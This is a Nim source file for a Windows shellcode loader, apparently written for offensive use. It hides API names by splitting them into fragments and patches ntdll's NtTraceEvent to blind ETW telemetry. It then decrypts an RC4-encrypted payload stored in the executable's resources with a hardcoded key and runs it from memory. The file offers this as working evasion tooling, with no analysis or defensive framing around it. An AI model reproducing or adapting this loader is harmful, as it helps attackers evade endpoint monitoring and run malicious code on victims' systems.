import winim
import nimcrypto
import includes/DLoader
import includes/rc4
import strutils
import dynlib

func toByteSeq*(str: string): seq[byte] {.inline.} =
  ## Converts a string to the corresponding byte sequence.
  @(str.toOpenArrayByte(0, str.high))

when defined amd64:
    const patch: array[1, byte] = [byte 0xc3]
elif defined i386:
    const patch: array[4, byte] = [byte 0xc2, 0x14, 0x00, 0x00]

# const encContent = slurp("encContent.bin")

var currentModule: HINSTANCE

type
    USTRING* = object
        Length*: DWORD
        MaximumLength*: DWORD
        Buffer*: PVOID

var keyString: USTRING
var imgString: USTRING

# Same Key
var keyBuf: array[16, char] = [char 't', 'e', 's', 't', 'K', 'e', 'y','t', 'e', 's', 't', 'K', 'e', 'y', 't', 'e']

keyString.Buffer = cast[PVOID](&keyBuf)
keyString.Length = 16
keyString.MaximumLength = 16

var VirtAl = ""
VirtAl.add("Vi")
VirtAl.add("rt")
VirtAl.add("ua")
VirtAl.add("lA")
VirtAl.add("ll")
VirtAl.add("oc")

var VirtPr = ""
VirtPr.add("Vi")
VirtPr.add("rt")
VirtPr.add("ua")
VirtPr.add("lP")
VirtPr.add("ro")
VirtPr.add("te")
VirtPr.add("ct")

type
    VirtualAlloc_t* = proc(lpAddress: LPVOID, dwSize: SIZE_T, flAllocationType: DWORD, flProtect: DWORD): LPVOID {.stdcall.} 
    VirtualProtect_t* = proc(lpAddress: LPVOID, dwSize: SIZE_T, flNewProtect: DWORD, lpflOldProtect: PDWORD): WINBOOL {.stdcall.}

var VirtualAlloc_p*: VirtualAlloc_t

var VirtualProtect_p*: VirtualProtect_t
var k32Addr: HANDLE = get_library_address() 

VirtualAlloc_p = cast[VirtualAlloc_t](cast[LPVOID](get_function_address(cast[HMODULE](k32Addr), VirtAl)))
VirtualProtect_p = cast[VirtualProtect_t](cast[LPVOID](get_function_address(cast[HMODULE](k32Addr), VirtPr)))

proc Patchn(): bool =
    var
        ntdll: LibHandle
        cs: pointer
        op: DWORD
        t: DWORD
        trace: string
        ntd: string
        disabled: bool = false

    trace.add("Nt")
    trace.add("Trace")
    trace.add("Event")
    
    ntd.add("nt")
    ntd.add("dll")

    ntdll = loadLib(ntd)
    if isNil(ntdll):
        return disabled

    cs = ntdll.symAddr(trace.cstring)
    if isNil(cs):
        return disabled

    if VirtualProtect_p(cs, patch.len, 0x40, addr op):
        copyMem(cs, unsafeAddr patch, patch.len)
        discard VirtualProtect_p(cs, patch.len, op, addr t)
        disabled = true

    return disabled

proc execute(): void =
    var resourceId = 100
    var resourceType = 10

    # Get pointer to encrypted shellcode in .rsrc section
    #echo "currentModule is: ", currentModule
    var myResource: HRSRC = FindResource(cast[HMODULE](currentModule), MAKEINTRESOURCE(resourceId), MAKEINTRESOURCE(resourceType))

    #if myResource == 0:
      #echo "FindResource failed!"
      #echo GetLastError()

    var myResourceSize: DWORD = SizeofResource(cast[HMODULE](currentModule), myResource)

    #[ if myResourceSize == 0:
      echo "SizeOfResource failed!"
      echo GetLastError()
    ]#
    var hResource: HGLOBAL = LoadResource(cast[HMODULE](currentModule), myResource)
    #[if hResource == 0:
      echo "LoadResource failed!"
      echo GetLastError()
    else:
      echo "hResource at: ", toHex(hResource)
    ]#
    var oldProtect: DWORD

    let buffer = VirtualAlloc_p(cast[LPVOID](0), cast[SIZE_T](myResourceSize), MEM_COMMIT, PAGE_READ_WRITE)
    let memBuff: int = cast[int](buffer)
    #echo "Mem buffer at: ", memBuff.toHex
    #echo "VA Called!"
    copyMem(buffer, cast[LPVOID](hResource), myResourceSize)
    #echo "CopyMem Called!"
    imgString.Buffer = buffer
    imgString.Length = myResourceSize
    imgString.MaximumLength = myResourceSize

    #echo "imgString is: ", repr &imgString
    #echo "imgString location: ", toHex(cast[int](&imgString)) 
    #echo "keyString is: ", repr &keyString
    #echo "keyString location: ", toHex(cast[int](&keyString))
    #echo "keyString Buffer Location: ", toHex(cast[int](&keyString.Buffer))

    SystemFunction032(&imgString, &keyString)
    echo "SF032 Called!"

    discard VirtualProtect_p(buffer, cast[SIZE_T](myResourceSize), PAGE_EXECUTE_READ, addr oldProtect)
    #echo "VP Called!"
    let f = cast[proc(){.nimcall.}](buffer)
    f()
    
when isMainModule:
    discard Patchn()
    execute()